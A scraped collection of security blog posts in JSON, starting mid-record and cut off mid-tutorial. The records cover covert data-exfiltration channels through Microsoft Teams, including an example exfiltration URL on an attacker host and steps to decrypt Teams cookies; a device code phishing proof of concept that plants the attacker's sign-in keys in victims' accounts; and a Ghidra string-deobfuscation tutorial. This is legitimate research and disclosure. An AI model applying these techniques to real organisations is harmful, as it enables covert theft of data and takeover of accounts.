new opportunities for extracting information, even in the presence of security policies and strict egress traffic rules.       ...        Previous work on covert channels using GIF images has already been conducted by Bobbyr, where he introduces the concept of covert channels in MS Teams.       ...       ",
    "html_url": "https://blog.compass-security.com/2024/01/microsoft-teams-covert-channels-research/",
    "text": "This article illustrates how custom command and control (C2) implants can circumvent network monitoring systems and security measures by piggybacking on Microsoft Teams traffic. Such C2 channels could facilitate unauthorized data transfers or enable malicious activities within the victim network and systems. The major goal of threat actors is to establish such channels covertly and to go unnoticed along all other network communication. This post does not detail how to get malicious code running on a victim system but rather how an implant maintains an interactive communication channel with the attacker.\n\nCompass runs quite some red team exercises. With red teaming we specifically refer to full chain attacks, including initial access, detection evasion activities and maintaining access to complete missions. Usually, without knowing much about the victim organization. Working in these fields is a little arms race as detection teams and tooling picks up with the red teamers’ ideas gradually. Thus, we invest significant time to search for new techniques to bypass malware filters and into approaches to establish covert channels.\n\nWe understand that this knowledge is very sensitive, but we also want to share our fact findings with the community, so folks on the white hat side of cyber have a chance to understand the impact and get means to elaborate and discuss effective prevention and detection measures.\n\nWith the rise of remote work, Microsoft Teams has become the de-facto standard for video conferences, chat, and collaboration. The nature of the Teams architecture are some central systems that route information between parties. Therefore, Teams client software must be allowed to communicate with systems on the Internet. Microsoft even recommends letting Teams traffic bypass inspection proxies for compatibility reasons. Its network communication pattern has significant overlap with malicious C2 traffic and thus it is nearly impossible for blue teams to spot adversary communication. Therefore, Teams is an interesting candidate to be abused for C2 traffic.\n\nThe illustrated covert channels enable connections between two parties and pass through Microsoft servers as a fixed hop to avoid detection.\n\nFigure 1: Basic Overview\n\nThe above figure (Figure 1: Basic Overview) depicts the scheme of the covert channels, using Microsoft Teams as the information carrier. One channel transports instructions from the attacker, while the other returns query results from the victim back to the attacker.\n\nIn this article, four covert channels are discussed, with three dedicated to outgoing and the fourth to incoming traffic. The identified covert channels for outgoing traffic include a webhook, a Teams message, and a Teams call channel. However, for incoming traffic, the article outlines a message covert channel, which is different from any of the outgoing message channel.\n\nOutgoing Channel: Webhook\n\nTL;DR this is a somewhat complicated approach to let the MS Teams central servers query arbitrary URLs (incl. exfiltration payloads) on behalf of a victim. It’s basically some kind of SSRF that helps an attacker fly under the radar because all victim requests are sent to the MS webhook endpoint.\n\nA webhook is an HTTP-based callback function to forward information into a Teams channel. In the Microsoft Teams settings, a webhook can be attached to a Teams channel, providing an outside world API to deposit messages in that channel. An endpoint URL is composed as https://xxxx.webhook.office.com/yyyyy, where xxxx corresponds to the tenant of the webhook’s owner and yyyy to the randomly generated ID. The webhook accepts Teams cards (JSON) as input. Thus, cards are sent with an HTTP POST to the webhook.\n\nThe following issues play a key role to establish such covert channels:\n\nAnyone can send messages to the webhook without any authentication token.\nImages linked in the JSON body of a Teams card can be fetched from any URL.\n\nThe covert channel is created by crafting a Teams card with an image linking to an attacker-controlled server. Data to be exfiltrated will be appended to the image URL. Specifically, the flow works as outlined in Figure 2.\n\nFigure 2: Incoming Webhook Covert Channel Flowchart\n\nOn the victim side, a Teams card (JSON) is created including an image reference linking to the attacker’s server (AS), appending data to be exfiltrated (resultquery).\nThe Microsoft server (MS) accepts the input from the client and it responds with a 201 status code.\nDuring the rendering, MS tries to fetch the linked image from AS. The GET request is sent out to AS (e.g., https://attacker-webserver.com/resultquery).\nThe AS will log the incoming request path and send back a 404 to MS, indicating a missing resource on the server (the server might alternatively return a random picture). MS renders the card with a default image without any error.\n\nThe video (Figure 3: Webhook Data Exfiltration Demo) displays a proof-of-concept setup and procedure for how data can be exfiltrated using webhooks.\n\nThe screen is split in three areas:\n\nThe Teams window displays a channel with a malicious webhook.\nThe top left command shell is the attacker server.\nThe bottom left command shell is the victim workstation.\n\nThe video will start by displaying the attacker’s public Internet address and proving that the attacker server can neither be reached by PING nor by HTTP requests. Therefore, traffic must be sent over Teams webhook endpoints (https://xxxx.webhook.office.com/yyyyy).\n\nAfterwards, the victim will launch a script that sends Teams cards to the webhook and appends each entry from a list of strings (data to exfiltrate) to an embedded image, which is then ultimately being requested from the attacker server. That way, the list of strings is exfiltrated.\n\nSo much for the attacker’s point of view. How can we prevent the scenario?\n\nThis type of covert channel could be prevented by blocking requests towards the webhook endpoint at the cost of functionality. Alternatively, we might consider to closely monitoring the webhook API requests for Teams cards that come with potentially malicious links to external images.\n\nIt might not be obvious at first glance but note that prohibiting webhook creation by Teams configuration will not necessarily stop an attacker from creating their own channel with a malicious webhook and using that one for an attack.\n\nOutgoing Channel: Teams Message\n\nThis covert channel exploits the possibility to retrieve authentication data from the filesystem and using it to interact with the Microsoft API. The authentication data is buried in cookies that are encrypted with a key which itself is protected by the DPAPI.\n\nThe relevant files are stored in the user profile folders:\n\nAppData/Roaming/Microsoft/Teams/cookies (key protected auth data)\nAppData/Roaming/Microsoft/Teams/LocalState (the DPAPI protected key)\n\nDecrypting the key with DPAPI allows for further decryption (AES-GCM) of the cookies. Interacting with the API directly allows an adversary to create, modify, delete, and read old messages from the chat. The API used to interact with the server is https://amer.ng.msg.teams.microsoft.com/, which is notably different than the Graph API advertised by Microsoft.\n\nWe agree, blocking access to the API is not the solution as it renders Teams useless. Alternative measure could include detection of unusual process communicating with the endpoint, detection of large chat messages or a high frequency of chat messages, which all would be a pattern of data exfiltration activity. However, this would need interception or proxyfication of Teams traffic which is not necessarily supported. Beyond that, most ideas boil down to preventing malware execution in the first place.\n\nOutgoing Channel: Teams Call\n\nA Microsoft Teams call can be established with two different protocols: STUN (Session Traversal Utilities for NAT) and TURN (Traversal Using Relays around NAT). The first protocol allows P2P communication, while the second protocol uses a relay server to set up the call in a client-server manner. The covert channel can be created by encapsulating the data into UDP packets and sending them over to the relay server. The incoming packets are not validated by the server and are thus forwarded to the other user on the call (the attacker).\n\nThe ICE protocol is required to negotiate with the server about the protocols to be used in the channel, since the client is unaware of the firewall’s enforced policy. It needs to check if a UDP or TCP connection can be established. The ICE protocol also determines where to connect and informs the client about the NAT setting of its own network. Once the client is successfully authenticated to the relay server, it should be able to send traffic to the server using e.g. UDP.\n\nFor the PoC videos, both User A and User B are run on the same local network segment. However, to avoid any confusion, the PoC is designed to inject additional packets to an outgoing UDP call (Figure 4) connection which was previously negotiated using the ICE protocol and all traffic is relayed over an Internet server.\n\nThe PoC concept is to wait on an established call and then to attach to the socket to inject UDP packets which are then sent to the relay server who happily forwards the packets to the attacker.\n\nOn the receiving end (the attacker side) of the call, a script sniffs on the incoming UDP stream and writes packet data to the console. See Figure 5.\n\nTo be fair, this is a rough implementation. However, piggybacking on the audio UDP stream did not influence voice quality which comes in really handy. Thus, the PoC clearly highlights the feasibility of data exfiltration over standard phone call communication protocols. Anyways, to be fair again, Teams is not the only software that implements some sort of hole-punching and relaying to allow NATed devices to communicate with each other.\n\nMitigations for this type of channel are even harder to implement. You could restrict UDP traffic for the downsides that come with voice over TCP. Injection into TCP is surely harder to achieve and would be a great field to push this study further. At least in theory, behavioral analysis of network traffic could help to detect such traffic. Unfortunately, the call’s UDP packets and the data to exfiltrate, specifically when data is encrypted before exfiltration, have very similar entropy.\n\nIncoming Channel: Messages\n\nThis fourth and last covert channel allows for an incoming connection from the attacker to the victim. The channel allows carrying instructions from the C2 server to the victim’s computer. Note that the communication between attacker and victim is always indirect, with a Microsoft server relaying messages in between. The channel exploits the message flow in a similar manner as the previous covert channel. To send a Microsoft Teams message through the API on https://amer.ng.msg.teams.microsoft.com, the following JSON structure is needed:\n\n{\t\n   \"content\":\"\",\t\n   \"contenttype\":\"text\",\t\n   \"messagetype\":\"text\",\t\n   \"clientmessageid\":,\t\n   \"imdisplayname\":\"\",\t\n   \"properties\":{\t\n      \"importance\":\"\",\t\n      \"subject\":\"\"\t\n   }\t\n}\t\n\nIt is possible to send HTML instead of text in the “content” field, defining key “messagetype” to “RichText/Html”.\n\n{\t\n   \"content\":\"<p value='secretMessage'> message </p> \"\",\t\n   \"contenttype\":\"text\",\t\n   \"messagetype\":\"RichText/Html\",\t\n   \"clientmessageid\":,\t\n   \"imdisplayname\":\"\",\t\n   \"properties\":{\t\n      \"importance\":\"\",\t\n      \"subject\":\"\"\t\n   }\t\n}\t\n\nIn this case, there seems to be a lack of validation for special attributes within a tag. The paragraph tag allows defining “value” attributes that are not stripped by the server. The content of the value attribute is not visualized by Microsoft Teams, despite being transferred to the victim’s computer. Once the server has sent the message through the receiver’s WebSocket, the entire message can be fetched from the WebSocket using the Teams cookies or by reading the log file maintained by the Teams Application at the following path: %userprofile%/AppData/Roaming/Microsoft/Teams/IndexedDB/https_teams.microsoft.com _0.indexeddb.leveldb\n\nThe same mitigations strategies apply: content filtering and detection of unusual content.\n\nGeneral Defense and Countermeasures\n\nAlthough there needs to be adequate content filtering, blocking certain IP addresses that offer webhook capability would help mitigate the webhook covert channel. The usual image path requested for the Teams card diverges significantly when data is being exfiltrated and that should be easy to spot.\n\nRegarding the message and the call channels, disabling the functionality of communication with external tenants would eliminate these channels completely. However, this comes with the burden of whitelisting trusted peer tenants.\n\nThis is also Microsoft’s recommendation. Best practice for exchanging information with other tenants is individually whitelisting them using tools such as Microsoft Purview Information Barriers.  Alternatively, to reduce the risk while still allowing the communication with external users, the detection can be applied to the message covert channel using Microsoft auditing service.\n\nThe detection for the call covert channel is extremely complex since the identification of (additional) bytes inside the UDP has similar entropy as the media data.\n\nConclusion\n\nThe discovery of covert channels within Microsoft Teams introduces new opportunities for extracting information, even in the presence of security policies and strict egress traffic rules. This work demonstrates the potential to establish covert channels by leveraging the architecture of Microsoft Teams and emphasizes the need for configuration hardening and whitelisting approaches.\n\nThe discussed covert channels come with quite high stability and performance, being able to exfiltrate 90KB/s with the message, 32KB/s with the call, and 6KB/s with the webhook covert channel.\n\nCurrently, there is no command-and-control framework known to us using these covert channels. Maybe due to Teams’ continuous transformation. The infrastructure changes constantly and to make the C2 reliable, the implant would need to change constantly as well, especially with the upcoming new Microsoft Teams release.\n\nCredits\n\nPrevious work on covert channels using GIF images has already been conducted by Bobbyr, where he introduces the concept of covert channels in MS Teams.\n\nThis research was conducted by Massimo Bertocchi and takes Bobbyr’s article as a basis to advance the study of covert channels. The practical work was conducted under the supervision of Compass Security and formed the foundation for his Master Thesis at the Royal Institute of Technology (KTH), Stockholm, Sweden. The full 75 pages paper outlining general Teams details and further C2 or malware design details is available at the KTH diva portal.",
    "title": "Microsoft Teams Covert Channels Research"
}
{
    "brief": "This allows an attacker to backdoor the account or perform the self-service password reset for the account with the newly registered sign-in methods.       ...        Basically, a user can start a login flow on one device and finish it on another device with better keyboard input.       ...        To do this, the attacker impersonates an existing application (client) on Azure and, if the phishing is successful, gains the application’s permissions combined with the user’s permissions for the requested resource.       ...        To set a new security key, the ngcmfa claim must be present in the access token.       ...        With the required scope, client ID, token requirements and web application calls, we were able to write a PoC that allows to initiate a device code flow and register a security key for the victim’s account when it is completed.       ...        You can find the PoC code here: https://github.com/CompassSecurity/deviceCode2SecurityKey       ...        It is also possible to register email, phone or TOTP tokens, but this is not implemented in the PoC.       ...        It is now possible to log in as a user without a password or 2FA key.       ...        From our point of view, even though Device Code Phishing is already known and well documented, our attack is new and allows persistence into the account of the target victim.       ...       ",
    "html_url": "https://blog.compass-security.com/2024/01/device-code-phishing-add-your-own-sign-in-methods-on-entra-id/",
    "text": "TL;DR An attacker is able to register new security keys (FIDO) or other authentication methods (TOTP, Email, Phone etc.) after a successful device code phishing attack. This allows an attacker to backdoor the account or perform the self-service password reset for the account with the newly registered sign-in methods. Although we see a great security risk, Microsoft deemed this not a vulnerability.\n\nDevice Code Phishing\n\nFor those of you who have never heard of device code phishing, the following blogs are very insightful:\n\nhttps://aadinternals.com/post/phishing/\nhttps://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html\n\nIn short, device code phishing is the misuse of the OAuth2 Device Authorization Grant flow (RFC 8628). This flow is intended for devices with limited or no keyboard interaction, such as TVs or desk phones. Basically, a user can start a login flow on one device and finish it on another device with better keyboard input. As an attacker, we can also initiate the flow and have the victim complete it. To do this, the attacker impersonates an existing application (client) on Azure and, if the phishing is successful, gains the application’s permissions combined with the user’s permissions for the requested resource.\n\nDelegated access from https://learn.microsoft.com/en-us/graph/permissions-overview?tabs=http\n\nWe recently published our tooling to perform device code phishing, for more information read the following article: https://blog.compass-security.com/2023/10/device-code-phishing-compass-tooling/.\n\nmysignins.microsoft.com – Self-Service\n\nUsers in Entra ID can normally manage their own login methods via https://mysignins.microsoft.com/security-info. A user can manage authentication methods such as TOTP, phone, email, security key, etc., depending on what the tenant’s administrator has allowed.\n\nSecurity-Info for a user in Entra ID\n\nBy intercepting the OAuth 2 calls while accessing the mysignins web application, we were able to identify the access token requirements.\n\nThe scope and audience must be set to Microsoft App Access Panel (0000000c-0000-0000-c000-000000000000). The client ID can be set to any member of the FOCI1 family. It is not clear why FOCI1 group has the necessary permissions. One explanation for this could be that the Microsoft Authenticator App (4813382a-8fa7-425e-ab75-3b753aab3abb) is member of the FOCI1 group and allows to update the security info.\n\nMicrosoft Authenticator App – Update security info\nFamily of Client IDs (FOCI)\n\nNormally, a refresh token for application Y cannot be used to get an access token for application X. But in Azure there is something called “Family of Client IDs”. Microsoft “groups” some applications into the same family. Members of the same family can exchange their refresh token for tokens of another family member. Check out this GitHub repository for a list of clients and their permissions on various APIs.\n\nngcmfa claim\n\nTo set a new security key, the ngcmfa claim must be present in the access token. This is not required to add other authentication methods such as phone, email or TOTP. The ngcmfa claim is only valid for ~15 minutes after authentication. This gives the attacker a short window of time after the user has authenticated to register their own security key.\n\nPoC – deviceCode2SecurityKey\n\nWith the required scope, client ID, token requirements and web application calls, we were able to write a PoC that allows to initiate a device code flow and register a security key for the victim’s account when it is completed. You can find the PoC code here: https://github.com/CompassSecurity/deviceCode2SecurityKey\n\nThis allows you to authenticate to services without a password or additional 2FA method. It is also possible to register email, phone or TOTP tokens, but this is not implemented in the PoC. Here is a brief description of the PoC:\n\nOur code initiates the device code flow with the required parameters.\nThe user code is sent to the victim. The victim logs in and provides the required consent.\nWe then request the required tokens (sessionCtx) and initiate the registration of a new security token.\nFor that, we open Chrome which is used to interact with the security key (webauthn interface).\nWhen the security key is registered, the PoC completes the registration.\nIt is now possible to log in as a user without a password or 2FA key.\n\nThe following video shows the whole process:\n\nDisclosure process\n\nThis issue was raised with the Microsoft Security Response Center (MSRC) on September 14th 2023 and we didn’t hear back from them until 8 December 2023.\n\nTheir response states that:\n\n“The functionality for adding authentication methods is behaving as designed in that it validates the MFA claim and ensures it was created within 15 minutes. The core vulnerability here is the Device Code Phishing attack, which results in a valid MFA claim being generated. This is already known and well documented.”\n\nMSRC\n\nFrom our point of view, even though Device Code Phishing is already known and well documented, our attack is new and allows persistence into the account of the target victim. As the ngcmfa claim is only necessary when adding a security key, this seems to be a special operation. Furthermore the fact that the FOCI1 group has the permissions to add such authentication methods is in our opinion concerning.\n\nPrevention and Detection of Device Code Phishing\n\nAs mentioned in our previous post, it is not currently possible to disable device code flow for Microsoft’s first-party applications.\n\nThe most effective way to limit the risk is to set restrictive Conditional Access (CA) policies so that only MDM/MAM managed devices are allowed to connect. Another option is to restrict logins from known IP addresses. This works because the IP address of the flow initiator is checked against the CA.\n\nDetection, on the other hand, is fairly straightforward. Monitor the Sign-In logs for authentication protocol = device code",
    "title": "Device Code Phishing – Add Your Own Sign-In Methods on Entra ID"
}
{
    "brief": "void xorString(char *str, char *key, int size, _Atomic int *status) { // Check and update status atomically int expected = 1; if (atomic_compare_exchange_strong(status, &expected, 0)) { // Perform XOR operation if the string is encrypted for (int i = 0; i < size; i++) { str[i] ^= key[i % 4]; } } }       ...        String 1: Hello World String 2: Auto Decryption String 3: With Python       ...        Let’s open this in Ghidra and get started.       ...        In this example, the xorString function is quite straightforward, but let’s just imagine it’s a bit more complex and we can’t immediately figure out how it works based on the listing or decompiled code.       ...        So rather than trying to get that up and running, let’s use Ghidra’s emulator.       ...        This will open the Ghidra emulator.       ...        Of course, since we skipped the strlen function, the correct value is not in x0.       ...        The current value of x0 is 0x103c00 (the location of the string) and we need to replace this with the length.       ...        You can now hover over the ds to see that the length of the string is 12 (0xc), but we have to subtract one for the null byte so the length is 11.       ...        Before you modify the register, click the button at the top of the registers window to enable editing and then double click the value of the x0 register and update it to 11:       ...        Normally we would have to allocate some space on the stack to store the old value of x8, but since we know that x8 will be overwritten in the line after our strlen call, we know it’s free to use.       ...        Finally, we can step through the trace and this time it will skip over the strlen call and store the length of the string in x0:       ...        The code will figure out if the string still needs to be decrypted and if so, try to update the status.       ...        If we look at the listing, the instruction that triggered the error is stlxr:       ...        The stlxr instruction is the exclusive version of the non-exclusive str instruction which simply stores a value at a certain position.       ...        In the next line (0x101790) the w10 register, which is no longer there, is checked and we jump to the top of the block if it’s not equal to zero (cbnz).       ...        Create a script that we can trigger after selecting a specific call to xorString.       ...        Retrieve all references to the chosen decryption function Check each reference to make sure it’s a function call Go up from the function call until we find correct values for all parameters (x0, x1, x2, x3) Extract correct values from memory (e.g. collect the byte array at x0) Use a custom python function to decrypt Assign the decrypted string as the label of the encrypted byte array in the listing       ...        # Get the instruction at that address inst = getInstructionAt(caller)       ...        def assignPrimaryLabel(address, label_name): try: # Get the current program's symbol table symbolTable = getCurrentProgram().getSymbolTable()       ...        def getStringLength(address): # print(\"String length of \", address) length = 0 while True: # Read a single byte byteValue = memory.getByte(address)       ...        Note: It’s not possible to use a bytearray as the second argument for memory.getBytes (see this Ghidra issue).       ...       ",
    "html_url": "https://blog.nviso.eu/2024/01/15/deobfuscating-android-arm64-strings-with-ghidra-emulating-patching-and-automating/",
    "text": "In a recent engagement I had to deal with some custom encrypted strings inside an Android ARM64 app. I had a lot of fun reversing the app and in the process I learned a few cool new techniques which are discussed in this writeup.\n\nThis is mostly a beginner guide which explains step-by-step how you can tackle a problem like this. Feel free to try it out yourself, or just jump to the parts that interest you.\n\nIn this tutorial-like blogpost, we will:\n\nCreate a small test app that decrypts some strings in-memory\nUse the Ghidra Emulator to figure out the decrypted value. This will require some manual intervention\nAutomate the decryption using Python\n\nWhile I learned these techniques analyzing an Android app, they can of course be used on any ARM64 binary, and the general techniques work for any architecture.\n\nCreating a test app\n\nLet’s start with creating a small test app that decrypts some strings using a basic XOR algorithm. It’s always good to isolate the problem so that you can focus on solving it without other potential issues getting in the way. The code snippet below contains three encrypted strings, and a xorString function that takes a string and a key and performs the XOR operation to obtain the actual string. Additionally, there is a status integer for each string to indicate if the string has already been decrypted. The status integer is atomic, so that if multiple threads are using the same string, they won’t interfere with each other while decrypting the string. Using atomic status flags isn’t actually necessary in this small example, since we only have one thread, but it is what the original app was using, and it is very common to see this kind of approach.\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\t\n#include <stdio.h>\n#include <stdatomic.h>\n#include <string.h>\n#include <stdlib.h>\n \nvoid xorString(char *str, char *key, int size, _Atomic int *status) {\n    // Check and update status atomically\n    int expected = 1;\n    if (atomic_compare_exchange_strong(status, &expected, 0)) {\n        // Perform XOR operation if the string is encrypted\n        for (int i = 0; i < size; i++) {\n            str[i] ^= key[i % 4];\n        }\n    }\n}\n \nchar string1[] = {0x70,0xea,0xc7,0xd4,0x57,0xaf,0xfc,0xd7,0x4a,0xe3,0xcf,0x00};\n_Atomic int status1 = 1; // 1 for encrypted\nchar string2[] = {0xce,0xc6,0x40,0x93,0xaf,0xf7,0x51,0x9f,0xfd,0xca,0x44,0x88,0xe6,0xdc,0x5a,0x00};\n_Atomic int status2 = 1; // 1 for encrypted\nchar string3[] = {0x45,0xf6,0x8d,0x57,0x32,0xcf,0x80,0x4b,0x7a,0xf0,0x97,0x00};\n_Atomic int status3 = 1; // 1 for encrypted\n \nchar key1[4] = {0x38, 0x8f, 0xab, 0xb8};\nchar key2[4] = {0x8f, 0xb3, 0x34, 0xfc};\nchar key3[4] = {0x12, 0x9f, 0xf9, 0x3f};\n \nint main() {\n \n    xorString(string1, key1, strlen(string1), &status1);\n    xorString(string2, key2, strlen(string2), &status2);\n    xorString(string3, key3, strlen(string3), &status3);\n \n    printf(\"String 1: %sn\", string1);\n    printf(\"String 2: %sn\", string2);\n    printf(\"String 3: %sn\", string3);\n \n    return 0;\n}\n\nNote: The code above definitely still has race conditions, as one thread could be reading out the string before it is completely decrypted. However, I didn’t want to make the example more complex and this example has all the necessary ingredients to examine some interesting Ghidra functionality.\n\nIn order to compile it, let’s use the dockcross project, which allows us to very easily crosscompile via a docker instance:\n\n1\n2\n3\n4\n5\n\t\ndocker run --rm dockcross/android-arm64 > ./dockcross-android-arm64\nchmod +x dockcross-android-arm64\n./dockcross-anroid-arm64 bash -c '$CC main.c -o main'\nfile main\n# main: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /system/bin/linker64, not stripped\n\nThis will result in a non-stripped ARM aarch64 binary. In a real scenario, the binary would most likely be stripped, but for this exercise, that’s not needed. The binary can be pushed to our Android device and it will print the decrypted strings when running it:\n\n1\n2\n3\n4\n5\n6\n\t\nadb push main /data/local/tmp/\nadb shell /data/local/tmp/main\n \nString 1: Hello World\nString 2: Auto Decryption\nString 3: With Python\n\nGreat! Let’s open this in Ghidra and get started. Create a new project, import the main binary and perform a quick auto analysis. This will give you the main Ghidra listing, and the decompiled main function is decompiled very cleanly:\n\nLooking at string1, string2 and string3, Ghidra doesn’t identify any interesting strings, which makes sense due to the fact that they are obfuscated:\n\nIn the main listing, we can see three invocations to the xorString function:\n\nThe arguments are kept in x0, x1, x2 and x3. This is of course pretty standard for aarch64, though it’s not uncommon to see other calling conventions due to optimizations or obfuscation.\n\nIn this example, the xorString function is quite straightforward, but let’s just imagine it’s a bit more complex and we can’t immediately figure out how it works based on the listing or decompiled code. One way to figure out the decrypted string is to attach a debugger and put a breakpoint right after the function call. However, any Android app that has custom string encryption most likely has some kind of Runtime Application Self-Protection (RASP), which means a debugger (or Frida) will immediately be detected. So rather than trying to get that up and running, let’s use Ghidra’s emulator.\n\nTracing in Ghidra\n\nGo to the main Ghidra project window and drag the main binary onto the emulator:\n\nThis will open the Ghidra emulator. We want to emulate the xorString function, which means we have to properly initialize all the registers. The first function call starts at 0x101860, so make sure that line is selected, and click the button to start a new trace:\n\nBefore letting the trace continue, add a breakpoint to line 0x101890 which is right after the first call to xorString. You can add a breakpoint by selecting the line and pressing k or by right-mouse clicking all the way on the left (where the trace arrow is) and choosing ‘Toggle Breakpoint’. Leave the default options and click OK.\n\nFinally, click the green Resume button at the top or tap F5 to start the actual trace. After starting the trace, not much will actually happen. The emulator will continue executing until the PC (as indicated in the Registers window) is trying to execute 0x104018 which is not a valid instruction address. So what happened? We can restart the trace by selecting line 0x101860 and clicking the Emulator button. Apparently, the emulator goes into the strlen function to determine the length of the obfuscated string. This strlen function is imported from an external library, and so the Emulator doesn’t have access to it.\n\nThere are at least two ways to get around this: Manual intervention, or creating custom sleigh code. Let’s take a look at both and we’ll start with manual intervention.\n\nManually skipping the strlen function\n\nStart a new trace and continue until you’ve reached the call to strlen (0x10186c). Next, click the ‘Skip instruction’ button to jump to the next line without actually executing the instruction:\n\nOf course, since we skipped the strlen function, the correct value is not in x0. We can patch this manually by opening the Registers window and filtering on x. The current value of x0 is 0x103c00 (the location of the string) and we need to replace this with the length. The string1 variable is a null-terminated string (otherwise strlen wouldn’t work) so we can take a look at the memory location (0x103c00) and count the number of characters. We can also label it as a c-style string by right-mouse clicking > Data > TerminatedCString\n\nYou can now hover over the ds to see that the length of the string is 12 (0xc), but we have to subtract one for the null byte so the length is 11. Back in our Registers window, we can now change the value of x0 to 11. Before you modify the register, click the button at the top of the registers window to enable editing and then double click the value of the x0 register and update it to 11:\n\nEmulating strlen\n\nAs an alternative, we can create some custom SLEIGH code that is run instead of the strlen function. First, close all the current traces via the Threads window. Next, start a new trace at 0x101860 and then add a breakpoint on the strlen call at 0x10186c. In the breakpoints window, right-mouse click on the breakpoint and choose ‘Set Injection (Emulator)’:\n\nAs the injection, we’ll use the following code:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\t\n# Initialize counter variable\nx8=0;\n# Top of our for-loop\n<loop>\n# If we read a null-byte, we know the length\nif (*:1 (x0+x8) == 0) goto <exit>;\n# Increase the counter\nx8 = x8+1;\n# Jump back to the top\ngoto <loop>;\n<exit>\n# Assign counter to x0\nx0=x8;\n# Don't execute the current line in the listing\nemu_skip_decoded();\n\nNormally we would have to allocate some space on the stack to store the old value of x8, but since we know that x8 will be overwritten in the line after our strlen call, we know it’s free to use. This code is very similar to the code from the official Ghidra documentation, just adapted for AARCH64. You can also continue reading the official documentation to figure out how to make this SLEIGH injection work for any call to strlen rather than just this single occurrence.\n\nBefore stepping through the trace, choose Debugger > Configure Emulator > Invalidate Emulator Cache, just to make sure the Emulator will pick up on our custom SLEIGH code. Finally, we can step through the trace and this time it will skip over the strlen call and store the length of the string in x0:\n\nContinuing with the trace\n\nContinue with single steps until you get to line 0x10178c. When stepping over this stlxr instruction, Ghidra throws an error:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\t\nSleigh userop 'ExclusiveMonitorPass' is not in the library ghidra.pcode.exec.ComposedPcodeUseropLibrary@73117252\nghidra.pcode.exec.PcodeExecutionException: Sleigh userop 'ExclusiveMonitorPass' is not in the library ghidra.pcode.exec.ComposedPcodeUseropLibrary@73117252\n    at ghidra.pcode.exec.PcodeExecutor.step(PcodeExecutor.java:275)\n    at ghidra.pcode.exec.PcodeExecutor.finish(PcodeExecutor.java:178)\n    at ghidra.pcode.exec.PcodeExecutor.execute(PcodeExecutor.java:160)\n    at ghidra.pcode.exec.PcodeExecutor.execute(PcodeExecutor.java:135)\n    at ghidra.pcode.emu.DefaultPcodeThread.executeInstruction(DefaultPcodeThread.java:586)\n    at ghidra.pcode.emu.DefaultPcodeThread.stepInstruction(DefaultPcodeThread.java:417)\n    at ghidra.trace.model.time.schedule.Stepper$Enum$1.tick(Stepper.java:25)\n    at ghidra.trace.model.time.schedule.TickStep.execute(TickStep.java:74)\n    at ghidra.trace.model.time.schedule.Step.execute(Step.java:182)\n    at ghidra.trace.model.time.schedule.Sequence.execute(Sequence.java:392)\n    at ghidra.trace.model.time.schedule.TraceSchedule.finish(TraceSchedule.java:400)\n    at ghidra.app.plugin.core.debug.service.emulation.DebuggerEmulationServicePlugin.doEmulateFromCached(DebuggerEmulationServicePlugin.java:722)\n    at ghidra.app.plugin.core.debug.service.emulation.DebuggerEmulationServicePlugin.doEmulate(DebuggerEmulationServicePlugin.java:770)\n    at ghidra.app.plugin.core.debug.service.emulation.DebuggerEmulationServicePlugin$EmulateTask.compute(DebuggerEmulationServicePlugin.java:261)\n    at ghidra.app.plugin.core.debug.service.emulation.DebuggerEmulationServicePlugin$EmulateTask.compute(DebuggerEmulationServicePlugin.java:251)\n    at ghidra.app.plugin.core.debug.service.emulation.DebuggerEmulationServicePlugin$AbstractEmulateTask.run(DebuggerEmulationServicePlugin.java:238)\n    at ghidra.util.task.Task.monitoredRun(Task.java:134)\n    at ghidra.util.task.TaskRunner.lambda$startTaskThread$0(TaskRunner.java:106)\n    at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)\n    at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)\n    at java.base/java.lang.Thread.run(Thread.java:1589)\nCaused by: ghidra.pcode.exec.SleighLinkException: Sleigh userop 'ExclusiveMonitorPass' is not in the library ghidra.pcode.exec.ComposedPcodeUseropLibrary@73117252\n    at ghidra.pcode.exec.PcodeExecutor.onMissingUseropDef(PcodeExecutor.java:578)\n    at ghidra.pcode.emu.DefaultPcodeThread$PcodeThreadExecutor.onMissingUseropDef(DefaultPcodeThread.java:205)\n    at ghidra.pcode.exec.PcodeExecutor.executeCallother(PcodeExecutor.java:562)\n    at ghidra.pcode.exec.PcodeExecutor.stepOp(PcodeExecutor.java:249)\n    at ghidra.pcode.emu.DefaultPcodeThread$PcodeThreadExecutor.stepOp(DefaultPcodeThread.java:182)\n    at ghidra.pcode.exec.PcodeExecutor.step(PcodeExecutor.java:268)\n    ... 20 more\n \n---------------------------------------------------\nBuild Date: 2023-Sep-28 1301 EDT\nGhidra Version: 10.4\nJava Home: /usr/lib/jvm/java-19-openjdk-amd64\nJVM Version: Private Build 19.0.2\nOS: Linux 5.15.0-76-generic amd64\n\nApparently the call to ExclusiveMonitorPass isn’t implemented for this Emulator so it doesn’t know what to do. The ExclusiveMonitorPass is there because of the atomic status flag which makes sure that different threads don’t interfere with each other while decrypting the string. We could simulate the call again with some custom SLEIGH code, but since our emulation is single-threaded anyway, let’s patch the code to remove the call altogether.\n\nPatching the decryption function\n\nCurrently, the decompiled code looks like this:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\t\nvoid xorString(long param_1,long param_2,int param_3,int *param_4)\n{\n  int iVar1;\n  char cVar2;\n  bool bVar3;\n  int local_30;\n \n  do {\n    iVar1 = *param_4;\n    if (iVar1 != 1) break;\n    cVar2 = 'x01';\n    bVar3 = (bool)ExclusiveMonitorPass(param_4,0x10);\n    if (bVar3) {\n      *param_4 = 0;\n      cVar2 = ExclusiveMonitorsStatus();\n    }\n  } while (cVar2 != '');\n  if (iVar1 == 1) {\n    for (local_30 = 0; local_30 < param_3; local_30 = local_30 + 1) {\n      